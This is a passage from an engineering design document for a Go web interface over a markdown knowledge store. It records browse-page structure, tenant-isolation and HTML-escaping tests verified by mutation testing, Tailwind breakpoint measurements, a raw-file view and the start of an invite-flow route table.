- 🔴 **AND THE SAME CHECK REFUSED A LEGITIMATE DEPLOYMENT, WHICH NO TEST COULD HAVE CAUGHT
  BECAUSE NO TEST DESCRIBED IT.** An equality against `ui.OAuthCallbackPath` exits 78 for a
  surface behind a path-prefixing proxy — `…/cairn/sign-in/github/callback` — which started and
  worked before the check existed. The assumption that failed was written one line above it
  ("the path half is this repository's"): a path PREFIX is the deployment's too. It is a suffix
  match now, and the proxy shape is a row in the table. ⚠ **What still cannot be checked here:
  whether the prefix matches the proxy's** — this process cannot know its own external origin,
  which is the same reason the scheme and host are unchecked.
- **No real provider.** Every test here stubs the exchange or stands up a local HTTP handler
  answering as the token endpoint. Nothing measures GoTrue's actual `/authorize` parameter
  handling, its allow-list matching, or whether `flow_type=pkce` behaves as documented on the
  operator's version. The first real sign-in is the measurement.
- **No browser.** `SameSite`, `__Host-`, and whether a browser follows the 303 with the flight
  cookie attached are all claims *about browsers* that no test here drives. The failure
  direction for the cookie prefixes is the safe one (an unsupporting browser treats the name as
  ordinary); the failure direction for `SameSite=Lax` on the callback is **not** — a browser
  that withheld it would refuse every provider sign-in.
- **No concurrency on the flight table.** It is mutex-guarded and the guard is not measured
  under contention.
- **Nothing measures the deployed instance**, which is the gap the retracted bullet at the end
  of Phase C's section now states honestly.

---

# Phase E — the browse surface: cards, search and two-level drill-down

The one page became three, and the reason is a usability defect rather than a feature
request. Two things were asked for, paraphrased rather than quoted because this repository
carries no captured text: **nothing on the page said what any of it WAS in the underlying
store** — what a heading named, what the items under it were, which part of a file they came
from — and **there was no way to click through to one entry's full detail.** Every guard on
this package was green while both were true, which is the shape worth recording: escaping,
authority, routing and class were all measured, and none of them is a claim about whether a
reader can tell what they are looking at.

| route | class | what |
|---|---|---|
| `GET /` | `content` | one card per readable scope, plus the search box (`?q=`) |
| `GET /scope?id=<control.ID>` | `content` | that scope's entry list |
| `GET /entry?scope=<control.ID>&ref=<stem>` | `content` | one entry: its sections and its line items |
| `GET /entry?scope=…&ref=…&view=raw` | `content` | the SAME row — the entry's file, as text. Not a route |

## 🔴 The decision this change settles: `internal/ui` reads entry STRUCTURE from `internal/store`, not through `internal/report`

`claudedocs/handoff-cairn-control-plane.md` filed *"whether `cairn-ui` should ever render
through `internal/report`"* as an open question with the closing condition **"a written line
for (d)"**. This is that line.

**Decided: `internal/ui` parses entry files with `internal/store`'s own parsers —
`store.ExtractSections`, `store.ParseJournalBullets`, `store.JournalBullet.OpennessPopulation`
— and renders the resulting VALUES as HTML. It does not render through `internal/report`, and
it does not write a parser of its own.** Three reasons, in the order they bind:

1. **`internal/report` renders TEXT whose bytes are pinned against the Python oracle.** Its
   whole contract is `RenderText`, and `tests/parity/` diffs those bytes byte-for-byte between
   two clients. A browser needs a `<section>` per heading and an `<li>` per bullet; getting
   there through `report` would mean parsing its rendered output back apart — a second parser
   with extra steps, whose input is a format deliberately frozen for a different consumer.
   Worse, it would make every HTML change on this surface a change to something the parity gate
   watches.
2. **A hand-rolled markdown reader here would be the duplicated predicate this repository
   refuses everywhere else.** `store.HeadingBlocks` already knows that a `#` inside a code fence
   is not a heading — its comment records that treating one as a heading ENDS the section early
   and surfaces half an entry's nuance while looking like a complete read.
   `store.ParseJournalBullets` already knows that an INDENTED `-` is a continuation and not a
   new bullet, measured over the live corpus. A browser that disagreed with either would render
   a structure the CLI contradicts, and the disagreement would look like a stale cache.
3. **Openness is decided in ONE place and this surface reads it.** The badge comes from
   `store.JournalBullet.OpennessPopulation`, which is the single source of the precedence order
   — its own comment records a delta audit on the oracle that found one bullet counted twice
   because two surfaces each decided membership for themselves. A renderer keyed on the word
   `OPEN` would be that third surface, and `TestTheBadgeComesFromThePopulationAndNotFromTheWords`
   is what refuses it (measured: that mutant lights two badges where one is correct).

⚠ **What IS imported from `internal/report`:** `SurfacedHeadings`, `CountedHeadings`,
`BasisEntryName`, the three search tuning constants, and `report.Search` itself. Those are
values and an engine, not a renderer. The search box in particular runs the same scored,
authority-narrowed search the CLI runs — a `strings.Contains` over titles would answer
differently from `cairn search` for the same query against the same store, which is the drift
`internal/report` being ONE package exists to prevent.

## 🔴 `Source.Visible` is the whole read for all three pages

A per-page `Entry(auth, scope, ref)` was the obvious alternative and was refused. Three views
of ONE narrowed answer means the refusal for *"not yours"* and the refusal for *"does not
exist"* are the SAME code path rather than two paths held byte-identical by discipline: the
scope page picks out of the narrowed list and the entry page picks out of that, so an id the
list does not carry is refused without the handler ever learning whether such a scope exists.

⚠ **What it costs, measured rather than waved at:** every page load parses every entry the
caller may read. `report.Search`'s own comment measures a full scan of a store this size in
single-digit milliseconds, and search already does exactly that on every query. If a deployment
outgrows it the fix is a cache in front of `Visible`, not a second narrowing seam behind it.

## 🔴 A refusal-only authority guard is not enough, and a surviving mutant is why this is written down

The first version of the authority guard asserted only that `/scope?id=<somebody else's>`
refuses with the same bytes as an absent one, in both directions, with the positive controls.
It was green — and the mutant that replaces `scopeSetOf(named)` with `store.Unrestricted()` in
`StoreSource.Visible`, which is exactly the shape of forgetting the narrowing, **SURVIVED it.**

The mechanism is worth stating because it is a second guard doing work nobody credited it
with. An unnarrowed load returns the foreign scope's directory, but the id map is built from
the AUTHORITY's `NamedScopes`, so that scope's card gets an EMPTY id and `pickScope` refuses an
empty id. The per-scope refusal therefore still held — **while the ROOT page listed the other
tenant's scope name, its entry refs and its bullet counts as an unlinked card.** Refused if you
click it, fully legible on the page.

`TestTheBrowsePagesRefuseAnotherPrincipalsScopeWithTheSameBytesAsAnAbsentOne` now asserts the
root page's content as well, and that mutant dies. The general form: **a guard on a REFUSAL is
not a guard on a LEAK**, because a leak needs no reachable URL.

## What each field on the page is in the underlying file

This table USED to be rendered on the pages as well, as `<details>` legends.
⚠ **All three legends — root, scope and entry — are DELETED, on an operator decision** (the
recency/filter change), as is the scope explainer the root cards and the scope page printed:
once the pages' own labels were clear the definitions read as noise on every visit. The short
definitions of the Aliases / Refs / Tags lists, and of "scope", moved into `title=` tooltips. So
this README is now the one full copy, and the entry legend's rows (sections, line items, dates,
the openness badges, inline code, operator/inferred, markers out of reach) are the table above
plus the badge sections of this document.

| on the page | in the store |
|---|---|
| card | one scope — a directory under the store root |
| card title | the scope's display name, which is also its directory name |
| card / row timestamp (`5m ago`) | the file's mtime on the pod's store (a card shows its NEWEST entry's) — see the recency section below |
| `N entries` | `.md` files in that directory the loader accepted |
| `N bullets declared open` | `## Nuance / work-history` bullets carrying an `OPEN:` marker, summed over the scope. ⚠ NOT `## Requirements` bullets — `readEntry` sums the nuance section only |
| ref | the filename without `.md`: `<slug>` or `<slug>.<kind>` |
| title | the `service:` key in the file's front matter |
| aliases / refs (chips) | the `aliases:` / `refs:` (or older `tasks:`) front-matter sequences, **as written** |
| tags (chips) | the `tags:` front-matter sequence, **folded** |
| `N history notes` | top-level bullets under `## Nuance / work-history` — display copy only |
| section | one `##` heading, its text as the heading — except `## Nuance / work-history`, shown as **History** with the verbatim line in its tooltip |
| line item | one top-level `-` bullet under a BULLETED section — `## Nuance / work-history` or `## Requirements` — continuations included |
| date | an ISO date the bullet's first line starts with |
| `OPEN` / `near-miss marker` / `resolved` | the bullet's `store` openness population — exactly one |
| `operator` / `inferred` | WHO stated a `## Requirements` line item, from a parenthetical immediately after the marker. Absent is a DECIDED third answer, not a weak `inferred` |

⚠ **THESE TABLES ARE NOT PINNED AGAINST THE CODE, AND A PIN WAS TRIED AND REJECTED WITH A
MEASUREMENT.** A round-1 audit found three of these rows stale at once — the code had begun
counting one population while every copy still said "bullets", and the rendered
`operator`/`inferred` badge appeared in no legend at all. The obvious fix is a test asserting
every label `render.go` emits appears here. It was written, and it reported **five** labels
absent: `the refs listed`, `journal bullets`, `OPEN / near-miss / resolved`,
`marker out of reach` — all four PRE-EXISTING — plus the new one.

🔴 **Those four are wording differences, not gaps** (this table says `OPEN` / `near-miss
marker` / `resolved` as separate cells, and `N bullets declared open` where the legend says
`declared open`), so satisfying the pin meant rewording a correct document to please a guard
invented for the occasion. That is a guard on WORDS — walkable by rewording in one direction
and brittle in the other — and `claude/RULES.md` is explicit that the fix for over-wide prose
is not another guard. **So the four absences are recorded here as the finding they are, and
the next person to edit either side gets this paragraph instead of a red test.** If a pin is
ever wanted, pin the SHAPE (a rendered badge class with no row anywhere) rather than the
label text.

🔴 **`declared open` and not `open`, and the word is load-bearing.** The marker is opt-in:
`report.RecalledEntry.OpenCount`'s own caveat is that a zero means *nothing was declared* and
NOT *nothing is open*, because every bullet written before the marker existed carries none. A
badge reading `0 open` over a scope full of unfinished work would be a completeness claim this
store cannot make.

## Dark always, and five breakpoints

The palette moved into `@theme` and the `@media (prefers-color-scheme: dark)` block is
DELETED — an operator decision: no light theme, no toggle. `html { color-scheme: dark }` goes
with it, so the browser's own scrollbars and form controls follow; with `light dark` a reader
on a light-mode machine got the dark palette from the tokens and light scrollbars on top of it.

🔴 **The structural form of the claim is that the GENERATED stylesheet contains no
`prefers-color-scheme` at all**, which is what `TestTheGeneratedStylesheetHasNoColourSchemePreference`
asserts — the state, not a spelling. A guard on the word `dark` is walkable by naming a class
`dark-mode`; a guard on a token value passes a tree that re-added a light branch under a
different name. Its positive control is `prefers-reduced-motion`, asserted PRESENT so the zero
cannot be produced by a stylesheet that lost every media query at once.

⚠ **The mechanism that made the deleted block work is kept in `tailwind.css` even though the
block is gone**, because it is the trap anybody re-introducing a theme switch walks into: an
override written inside `@layer base` LOSES to `@theme`, since Tailwind emits its theme inside
`@layer theme` and unlayered declarations beat layered ones regardless of order.

**`--breakpoint-ultra: 125rem`** (= 2000px at a 16px root) is a fifth rung above Tailwind's
`2xl` (1536px). The requirement is measured rather than guessed — the operator's display is
3427 CSS pixels, more than twice `2xl`, so every rule written against the default ladder
renders identically at 1536 and at 3427. ⚠ **2000 and not 3427:** a breakpoint is where a
layout should change, not a device somebody owns, and pinning it to one machine leaves every
display between 1536 and 3427 — most large monitors — on the `2xl` layout.

🔴 **It was spelled `2000px` for its whole first life and was DEAD at every width it existed
for, which is the second measured defect in this file's short history and the one that is
invisible to reading the stylesheet.** Tailwind v4 orders breakpoint variants by resolved size
and cannot order a `px` length against the `rem` defaults without assuming a root font size, so
the `ultra` blocks were emitted FIRST inside `body` — ahead of `sm`, `lg` and `xl`. At 3440px
all four queries match, media queries add no specificity, and the LAST declaration wins: the
shell capped at `xl`'s 80rem (1280px) and a real Chromium rendered **1232px of content in a
3440px viewport, 35.8% of the width**. ⚠ **The rule was present, correctly nested and
correctly valued in `app.css` the whole time** — grepping for `@media (width >= 2000px)` finds
it and proves nothing, because cascade order is not visible in a grep. Respelled in the
defaults' own unit it sorts last and wins; the same walk then measured **1696px, 49.3%**. The
mechanism, the retracted "it is an orphan rule" reading, and the instruction not to simplify it
back to `px` are in `tailwind.css` beside the key.

⚠ **The RUNG the breakpoint gates has since moved from `112rem` to `200rem`** — an operator
decision after looking at the rendered page, measured at **3104px, 90.2%** at 3440. The
breakpoint itself is unchanged at `125rem`, and the emitted order was re-read in `app.css`
rather than grepped for, for the reason above. See Phase F.

⚠ **`body` is the element that carries the ladder, and `.page-main` has no `max-width` of its
own** — so the element a reader would inspect to find the cap is not the element that sets it.
That is why the guard below measures `<main>` against the VIEWPORT rather than against any
declared value.

The card grid is `repeat(auto-fit, minmax(18rem, 1fr))` rather than a `grid-cols-N` ladder, so
the column count is a function of the CONTAINER: one column on a phone, as many as fit on an
ultrawide, and no sixth breakpoint needed when somebody buys a wider screen.

## `uiaudit` captures five widths and pushes two

| name | width | pushed |
|---|---|---|
| mobile | 390 | ✅ |
| tablet | 834 | — |
| laptop | 1280 | — |
| desktop | 1440 | ✅ |
| ultrawide | 3440 | — |

🔴 **The hub's viewport set is CLOSED and this repository cannot widen it.** `Validate`
refuses a page whose viewport is outside `{mobile, desktop}` — the server's contract — and the
hub matches its P2 pixel diff on `url`+`viewport`, so a page pushed under a name it has never
stored would be "new" on every run and the diff would say nothing forever. Capturing five
widths locally is what measures a responsive layout; pushing five would be a wire-contract
change. `BuildPayload` is where the filter lives, and
`TestOnlyTheHubsOwnTwoViewportsAreEverPushed` drives it through the real `BuildPayload` rather
than reading the `Push` field — a field nothing branches on is a declaration, not a guard.

🔴 **Four measurements are REFUSALS** (`refuseWalkRegressions`): no horizontal overflow at
any captured width, no script outside `ui.AllowedScriptSources` (no inline one, no foreign
`src`, no allowlisted one twice — it was `document.scripts.length == 0` until the filter), a
decodable axe `testEngine` on every capture, and a CONTENT FLOOR at the widest width.
⚠ **The script verdict is a claim about the
ORIGIN this walk boots, not about the page a reader receives** — the deployed surface's
served page carries injected script and rewritten content, measured; the scope, the numbers
and the retraction behind them are in the XSS section above. The first three were already being COLLECTED
and printed; nothing read them, so a responsive regression would have been a digit in a log
beside an exit 0. The width count is part of the verdict too — a matrix that silently collapsed
to one width produces zero overflow findings and reads exactly like a responsive surface.

🔴 **The content floor exists because `0 overflow` was CORRECT and meant nothing.** A walk over
65 captures at five widths reported no overflow on the tree whose pages used 35.8% of an
ultrawide viewport — **a container that is too NARROW never overflows**, so the entire class
"the page ignores the viewport" is structurally invisible to every other check here and shipped
green through seven CI jobs. Too-wide and too-narrow are different claims; both are now
asserted and neither replaces the other.

| | |
|---|---|
| what it asserts | `<main>`'s rendered width ≥ **80%** of `window.innerWidth`, at the 3440px capture only |
| why 80 | three real renders at 3440: the original defect **35.8%** (1232px, the `ultra` rung dead); the retired rung **49.3%** (1792px cap less 48px gutters); the layout now **90.2%** (3200px cap less the same gutters). 80 refuses the first two by 44.2 and 30.7 points and admits the third with 10.2 to spare |
| why it MOVED | 45% still refused the dead rung, so it would have stayed green — and it would also have stayed green for a silent revert to the 112rem rung, which is now a regression against an operator decision rather than the intent. A floor that admits both the old intent and the new one has stopped measuring the layout and is only measuring that SOME rung survived |
| it is a FLOOR | more is fine; nothing here asks a page to fill the screen, and nothing here has an opinion about line length below that line — prose is capped separately, in `tailwind.css` (`--measure-code` / `--measure-prose`), and this gate is structurally blind to it because it measures `<main>` and `<main>` carries the grids |
| scope is pinned | the fraction is not scale-free (the cap is an absolute 200rem), so the gate REFUSES rather than measures if the widest declared viewport stops being 3440 |
| one exemption | `/sign-in`, whose `<main>` IS its `max-w-md` card at 13%. It requires the PATH **and** the class `signin-main` — either alone is a hole a later page could walk through |
| reported, not counted | a clean run prints the narrowest fraction it actually saw, because "0 refusals" is also what a predicate wired to nothing prints |

Red/green matrix, measured in chromium 153.0.8010.52 over the walk's own hermetic pod: **RED**
at the branch tip before the breakpoint fix — 12 captures, 35.8% each, one regression class,
its own message — **GREEN** after, at 49.3%. Mutated a second way (the `ultra` cap narrowed to
60rem with the breakpoint left correct) it goes red again at **25.1%**, still as the only
regression class, so it dies for its own reason rather than riding the first fix.

**And a third mutant since the rung was widened** (`retiredUltraRung` in `refusals_test.go`):
the shell put back on `ultra:max-w-[112rem]` — 1696px, **49.3%**, a real render of the previous
tree — is now REFUSED as `CONTENT TOO NARROW`. That case is the witness for the re-derivation:
with `contentWidthFloor` reverted to 0.45 it is the one subtest that fails, and it fails by
NOT being refused. ⚠ `cleanWalk`'s fixture fraction moved with it, 0.60 → 0.92, because a
fixture deliberately not derived from the constant has to be re-checked against it; 0.60 clears
45% and does not clear 80%, so leaving it would have turned the POSITIVE CONTROL red — a
fixture failure that reads exactly like a broken gate.

⚠ **They are refusals at the WALK and not in `CaptureTarget`**, because this module's own
positive-control page deliberately overflows and deliberately carries a script. A refusal
inside the capture would have made the instrument's own validation impossible.

🔴 **`ExpandLinks` widened from "same path" to "a declared GET row", and that is a different
claim rather than a relaxation.** The old rule was written when the only link-publishing page
was the share index, whose links point back at `/share`. The browse pages link ACROSS rows:
`/` → `/scope?id=…` → `/entry?…`. A same-path rule declines every one of them, so the walk
would have captured the two new rows only in their parameterless form and reported success over
pages no reader sees — the same under-coverage the first draft of `targets.go` shipped, one step
along. What is NOT given up: the href must still be relative and host-less, must still carry a
query, and its path must be a row this server DECLARES. The new obligation is a `Path` dedupe in
the walk queue, because `/entry`'s breadcrumb links back to `/scope?id=X` and that cycle is now
reachable.

## What Phase E's tests still structurally cannot see

- **Whether the page is legible.** Every guard here is over rendered bytes or over a
  browser's layout numbers. "Can a reader tell what a card is" is the defect that prompted the
  whole change and no test in this repository can measure it — the legend is prose, and prose is
  checked by a person reading it.
- **The ultrawide end on a real display.** 3440 is an emulated viewport at device-scale-factor
  1. The operator's 3427px display has its own scale factor, font settings and browser chrome.
- **Search relevance.** `report.Search`'s scoring is gated by its own fixture corpus; nothing
  here asks whether the hits a reader gets are the hits they wanted.
- **A store large enough to hurt.** `Source.Visible` parses every readable entry on every page
  load. The fixture stores are a handful of files; nothing measures the page against a store
  where that is not free.
- **Concurrent readers.** Unchanged from Phase A: nothing runs two requests at the same instant.

# Phase F — the ultrawide rung, and the entry page as a document

Two operator follow-ups after seeing Phase E in a browser. They are one change because the
first one is what makes the second one necessary: a container ~90% of an ultrawide display is
right for the card grids and wrong for every sentence in it.

## 🔴 The rung moved on an operator decision, and the floor was RE-DERIVED rather than carried

`ultra:max-w-[112rem]` → `ultra:max-w-[200rem]`, gutters unchanged at `ultra:px-12`. Measured in
the same chromium over the same hermetic pod, at the 3440px capture, over 12 non-exempt pages:

| | `<main>` | of a 3440px viewport |
|---|---|---|
| before | 1696px | **49.3%** |
| after | 3104px | **90.2%** |

The arithmetic is `cap − 2×gutter`, and both halves are written beside the rule because the
fraction is what `uiaudit` asserts and a reader checking it has to be able to reproduce it.

⚠ **A cap and not `max-w-none`.** Uncapping is the tidier change and it removes the only bound
this layout has on a display nobody here has measured; it would also silently retire
`contentFloorWidth`, whose whole argument is that the cap is ABSOLUTE so the fraction has a
scope. The cap stays, and only its value moved.

🔴 **The breakpoint is untouched at `125rem`, and the emitted ORDER in `app.css` was re-read
rather than assumed.** The `ultra` rung's first life was spent dead because a `px` breakpoint
sorted before every `rem` default; the check that would have caught it is that the generated
`body` rule's media queries ascend, and a grep of the source is structurally incapable of seeing
it. Confirmed after this change: `40rem, 64rem, 64rem, 80rem, 125rem, 125rem`, so the `ultra`
declaration is last and wins.

The content floor's re-derivation, its third mutant and why `cleanWalk`'s own fixture fraction
had to move with it are in the `uiaudit` table above.

⚠ **One incidental measurement, recorded so it is not read as a regression.** Four more captures
at the 1280px laptop width report `main=1217px` where they reported `1232px` before. That is a
vertical scrollbar: the entry page is TALLER now (larger section headings, the unreachable-marker
callouts), the walk runs with `hide-scrollbars` false on purpose, and a scrollbar narrows the
layout viewport by ~15px. It is a consequence of content height, not of the width ladder, and
`horizontal_overflow` stayed 0 at all five widths.

## 🔴 The entry page renders three prefixes as STRUCTURE, and names everything it did not

The complaint was that the page rendered its own source: literal `## What it is` headings, raw
bullet text including the `OPEN:` marker, and inline code showing its backticks. Three
transformations, and **a transformation is a place the view can disagree with the file** — which
is the complaint this whole arc started from. So each one is paired with what happens when the
parser refuses:

| rendered as structure | when the parser refuses |
|---|---|
| a heading's `#` run becomes the heading | `headingParts` reports the run it FOUND; anything but `## ` also renders the file's own line in `.section-source` |
| an accepted `OPEN:` / `RESOLVED <sha>:` becomes a badge | `store.MarkerSpan` is **0** for every line `BulletOpenness` refused, so a NEAR MISS keeps its marker text — which is the entire finding |
| a `` `backtick` `` span becomes `<code>` | an unmatched backtick, an empty pair and anything inside a `store.IsFence` region are left exactly as typed |

🔴 **Neither cut spells a grammar.** `store.MarkerSpan` and `store.BulletMarkerSpan` are new
accessors over the patterns `BulletOpenness` and `ParseJournalBullets` already use, so "where
does the prefix end" and "was a marker declared" cannot come apart. A `TrimPrefix(line, "OPEN: ")`
at the call site would have cut at the wrong colon on `- 2000-01-02: OPEN: see foo: bar` and —
far worse — would have cut a near miss.

🔴 **The sha moved onto the badge, because the strip removed it from the line.** `RESOLVED <sha>:`
is what makes a closure claim checkable (`git cat-file -e <sha>`), so a badge reading only
`resolved` over a stripped line would have deleted evidence from the page while looking tidier.

🔴 **A marker the parser CANNOT REACH is a new callout, and it is a regression guard against
this change's own hazard.** Before the badge replaced the text, an `OPEN:` printed in a body was
ambiguous but visible; now an accepted marker is gone from the line, so a marker still printed
there is precisely the shape of one that declared nothing — and nothing on the page would have
said which it was. `.bullet-unreachable` names the OFFSET (the line itself is already on the
page, verbatim, two elements up) and reads `store.JournalBullet.UnreachableMarkers`, whose own
comment records the field case: a bullet whose only real marker sat several lines down, badged
solely by accident of a broken `RESOLVED —` above it, where fixing the broken line would have
SILENCED a still-open action.

🔴 **The provenance block and the explainer are KEPT, and the explainer's own claim was
corrected.** It read "its `##` headings, verbatim", which was true while the heading line was
printed as text and is false now. It states both transformations and that anything the parser
did not accept stays in the text. An explainer is a claim too.

⚠ **Inline code is scoped to the entry's own CONTENT and not to the page's prose**, which is a
judgement call rather than an oversight. The explainer, the legend and the notices keep their
literal backticks: they QUOTE the file's syntax (`## What it is`, `aliases:`), where a literal
backtick reads as "this is a string in the file" — and `ReplicaHonesty` is pinned as one whole
normalised string, so a span split there would be a second guard to move for a cosmetic reason.
It also keeps the new parse confined to the attacker-authored path, which is where its tests are.

⚠ **Nothing was de-monospaced and nothing reflows.** `whitespace-pre-wrap` in a `<pre>` stays,
so an author's own wrapping and indentation survive; reflowing wrapped prose is the transformation
most likely to mangle an indented block or a fence, and it was not asked for.

## The prose measure, and why it is TWO numbers

`--measure-code: 110ch` on `.section-body` / `.bullet-body` / `.hit-lines`, and
`--measure-prose: 72ch` on the eight prose classes, both as `min(100%, …)` so a phone stays
bounded by its container.

- **`ch`, not `px`**, because a measure is a count of CHARACTERS: `1ch` is the advance of `0` in
  the element's own font, so one value means the same thing in the proportional explainer text
  and in the monospace bodies. A `px` cap would be right for one and wrong for the other — which
  is why there are two values and not one.
- **110 is derived from the store**, not from taste: a container narrower than the writer's own
  wrap column RE-wraps every line, which is how a `<pre>` starts disagreeing with the file it is
  showing. MEASURED at **104 characters** — the widest line, and the widest `##`-body line, over
  the 122 entry files `tests/reader_fixtures.py`'s `build_store` writes. ⚠ One corpus, and the
  fixture one; read it as the floor the cap had to clear, not as a claim about anybody's store.
- **The list touches no grid and no row.** `.scope-grid`, `.card-entries`, `.entry-list`,
  `.provenance` and every `*-row` are the layout that is supposed to use the width. That split —
  grids wide, sentences not — is the condition the rung was widened under.
- **It is a selector list and not a class**, for the reason the reduced-motion block is unlayered:
  a cap spelled at every call site in `render.go` is one forgotten class away from being wrong.

## What Phase F's tests still structurally cannot see

- **Whether 90% of a real ultrawide display reads better than 49%.** That is the operator's
  judgement and the reason the rung moved; no guard here has an opinion about it. The floor only
  refuses the layouts that were measured to be wrong.
- **Whether 110ch and 72ch are comfortable.** Both are derived — one from the corpus, one from
  the ordinary typographic band — and neither is measured against a reader.
- **A store whose prose wraps past 110 columns.** The measurement is over the fixture corpus; an
  entry written at 140 columns will wrap on this page, which is the intended behaviour and is
  also a case nothing here exercises.
- **Escaping under a mutant that does not escape — ⚠ TRUE OF THIS SPLIT ONLY, and it stopped
  being true of the package the moment a second sink existed.** The inline-code split builds only
  `g.Text` and an attribute-free `h.Code`, so no mutant of IT can be written that fails to escape.
  What is measured instead is the differential itself, with its own positive controls: the payload
  inside the span is counted in the fixtures (non-zero) and counted on the rendered page (zero).
  🔴 Do not read this as a property of the package. The raw view (`rawBlock`) emits ONE node, so
  `g.Raw(e.Raw)` is a one-token non-escaping mutant, and it was written and watched kill
  `TestHostileEntryTextIsEscapedOnEveryBrowsePage`'s `entry-raw` row — see the raw-view
  section below for why that verdict had to be read with `-run` scoped to one guard. **A "cannot be mutated" claim is scoped
  to the code it was written about and expires the moment a new call site exists.**

## 🔴 The entry page is TWO views behind ONE route, and the switch is a query parameter rather than a script

`?view=raw` renders the entry's file as text instead of the structure the parsers found in
it. Three constraints decided the shape, and each of them refused an obvious alternative:

- **No JavaScript.** Tabs are where a browser surface usually grows its first script, and
  at the time this one had none and `uiaudit` asserted `document.scripts.length == 0` on every
  page. ⚠ The surface has since grown exactly ONE script, the scope page's entry filter, on an
  operator decision (see the section on it below); the entry page still carries none, and both
  guards now refuse any script outside `ui.AllowedScriptSources`. The argument here is
  unchanged by it: two server-rendered links cost nothing a script would have bought — a shareable URL, a
  working back button and a browser-native reload come free, which is `searchForm`'s ruling
  for the same shape.
- **No second route.** `routes` is an EXACT-MATCH map and the ledger's whole value is that
  the set of served paths is finite and enumerable. `/entry/raw` would be a second row for
  one answer about one entry, with a view name sitting where a ref used to be.
- **No second view in the DOM.** `:target`-driven CSS tabs were considered and refused:
  they need both views rendered at once, which doubles the page and puts the whole file
  into every rendered page load whether or not anybody asked for it.

**The raw view's provenance block carries `file` and `updated` only**, on an operator decision:
`scope` and `service:` are values parsed out of the front matter, which the raw text below shows
verbatim. The two kept rows are the ones the file's text cannot show (its name, its mtime); the
rendered view keeps all four, and the breadcrumb names the scope on both. Held by
`TestTheRawViewDropsTheFrontMatterProvenanceRowsAndKeepsTheRest`, which pins each view's `dt`
keys as a pair — RED at the parent on the raw half; the rendered half is what goes red if the
rows are deleted from both views.

**Exactly one value is recognised.** `?view=raw` selects the raw view; `""`, `RAW`,
`rendered`, `source` and anything else render the rendered view. That is `handlePage`'s
ruling for `?q=` restated — a view selector is not an authority question, so an
unrecognised value is answered with the page rather than with a refusal. The cost is that a
typo is silent, which is why the recognised spelling is pinned as a LITERAL in
`rawview_test.go` rather than read back off `QueryView`: a test written against the
constant would assert that the code agrees with itself, and renaming the value would follow
silently while breaking every URL already in the world.

**The authority seam does not move, and the order is the guard.** `handleEntryPage` sets
`RawView` *after* both refusals, so the raw view is a wider rendering of an entry the caller
was already proved to hold. Everything it shows came out of a file `Source.Visible` had
already loaded for this principal under `control.VerbRead`; what it adds is the part of that
file the PARSERS dropped, never a part of the store the AUTHORITY withheld.

### The RED proof, and two of the five guards are INVARIANT GUARDS rather than regression coverage

Measured at `38bea8b` (pre-change) and at the branch head:

| guard | at `38bea8b` | at HEAD |
|---|---|---|
| `TestTheRawViewShowsWhatTheRenderedViewStructurallyCannot` | **FAIL** | PASS |
| `TestBothEntryViewsOfferTheOtherOneAndMarkTheCurrentOne` | **FAIL** | PASS |
| `TestAnUnrecognisedViewValueRendersTheRenderedView` | **FAIL** | PASS |

⚠ **THE TWO INVARIANT GUARDS THAT USED TO SIT IN THIS TABLE HAVE MOVED, AND THE TABLE NO
LONGER NAMES THEM.** Both passed on pre-change code, because there they drove the RENDERED
view — already narrowed, already escaping — so neither was regression coverage. Rather than
keep them as their own tests, each was folded into the harness that already owned the rule
it asserts, and each was RE-MUTATION-TESTED in its new home:

- **The narrowing** now lives as the RAW-view row of
  `TestTheBrowsePagesRefuseAnotherPrincipalsScopeWithTheSameBytesAsAnAbsentOne`, compared
  against the SCOPE refusal rather than against the rendered one — stronger, because two
  handlers wrong together satisfy a raw-vs-rendered comparison. Mutant: a `?view=raw`
  conditional `403` above `pickScope`'s refusal. **RED at `browse_test.go:243`**, quoting
  the mutant's own sentence back.
- **The escaping** now lives as the `entry-raw` row of
  `TestHostileEntryTextIsEscapedOnEveryBrowsePage`, a markup-SHAPE differential rather than
  substring matching. Mutant: `rawBlock` emits `g.Raw(e.Raw)`. **RED on both the shape
  comparison and the `<script` count.** The pipeline half it cannot reach —
  `readEntry` reading a real file, and the HTTP layer — stayed behind as
  `TestAHostileFileReachesTheRawViewAsTextThroughTheREALPIPELINE`.

🔴 **THE FILE:LINE CITATIONS THIS SECTION USED TO CARRY WERE STALE WITHIN ONE COMMIT OF
BEING WRITTEN** — they named `rawview_test.go:280` and an assertion string that the fold had
already moved. A `file:line` in prose is a claim with a very short half-life; the guard
NAMES above are what a reader can still grep for.

🔴 **`rawban_test.go` KILLS THAT MUTANT TOO, WHICH IS THE "GREEN FOR THE WRONG REASON"
TRAP** — a mutant killed by a different guard's error says nothing about yours. So the
verdict was read with `-run` scoped to this guard alone, and the ban's own kill confirmed
separately, with the filter validated by counting its `=== RUN` lines first. A `-run`
pattern matching no test reports `ok`, and one draft of that check did exactly that. (The
Phase-D note this corrects has been fixed where it lives, not contradicted from here.)

### What this view's guards still cannot see

- **Whether the whole file is a sensible thing to render for a LARGE entry.** The store this
  serves is tens of kilobytes across tens of files; nothing here pins a ceiling, and a
  multi-megabyte entry would be sent in full. No such entry exists in any store this has
  been run against, so the limit is unmeasured rather than known-safe.
- ~~**The `<pre>` wrapping at a real viewport** is unobserved by `uiaudit`.~~ ✅ **CLOSED BY
  THIS CHANGE, and the correction is recorded rather than the sentence quietly deleted.**
  It read: *"the raw view is a page state `uiaudit` does not currently capture."* That was
  true when written and false by the time it shipped — the same change moved `/entry` into
  `linkExpanded`, so the walk follows the rendered view's link to `?view=raw` and captures
  it. Measured on the real `ExpandLinks` against the real route ledger: the rendered entry
  page publishes 6 hrefs, 2 expand (the raw view and the scope page), 4 decline, 0 bounded;
  the raw view's own 2 links are already enqueued, so the cycle terminates.
  ⚠ What is still only a HAND measurement is the pixel-level wrapping at 1440px; the walk
  captures the page, `refuseWalkRegressions` does not refuse on axe violations, and the
  `uiaudit` job is `continue-on-error`.
- **Anything an edge inserts downstream.** The zero-script assertion is about what THIS
  ORIGIN renders. That is the scope correction `#130` made to three "this surface ships
  none" spellings, and it applies here unchanged.

# Phase G — the invite flow's HTTP surface

The share flow's picker had nobody to offer. `Candidates` narrows to people you already share
a project with, the deployed control journal held one user, and the operator's ruling was to
lift that with an **invite flow** rather than by provisioning a second user by hand. The
service, the authorization and the redemption path landed first and were green with **nothing
reachable over HTTP**; this phase is the surface.

| route | class | what |
|---|---|---|
| `GET /invite` | `content` | the projects you may invite into |
| `GET /invite?project=<control.ID>` | `content` | that project's invitations, in every state, plus the mint form |
| `POST /invite` | — | mints one invitation and renders its link **once** |
| `POST /invite/revoke` | — | withdraws an open invitation, by DIGEST |
